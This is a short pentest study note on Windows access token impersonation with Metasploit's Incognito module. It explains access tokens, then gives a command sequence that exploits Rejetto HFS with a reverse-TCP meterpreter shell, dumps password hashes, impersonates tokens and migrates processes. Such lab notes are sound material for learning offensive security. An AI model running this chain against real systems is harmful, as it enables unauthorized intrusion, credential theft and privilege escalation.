---
up: "[[Windows Post Exploitation]]"
---

# Token Impersonation with Incognito

- Windows Access Token are core elements of the authentication process on Windows. They are created by LSASS.
- It is responsible for identifying and describing the security context of a process or thread running on a system
- They are generated by the winlogon.exe process every time a user authenticates successfully and includes the identity and privileges of the user account associated

- WAT are categorized based on the varying security levels assigned to them
	- Impersonate-level, can be used locally
	- Delegate-level, can be used on the network

- The following privileges are required for a successful impersonation attack:
	- SeAssignPrimaryToken
	- SeCreateToken
	- SeImpersonatePrivilege

- Incogito is a buit-in meterpreter used to impersonate user tokens after successful exploitation

## Demonstration

```bash
> db_nmap -sV <ip>
> use exploit/windows/http/rejetto_hfs_exec
> set payload windows/x64/meterpreter/reverse_tcp
# verify TARGETURI
> run
m> sysinfo
# good that arch is x64
m> getuid
m> getprivs
m> hashdump
m> load incognito
m> list_tokens -u
m> impersonate_token "<TOKEN\name>"
m> getuid
m> ps
m> migrate <explorer.exe>
m> hashdump
```
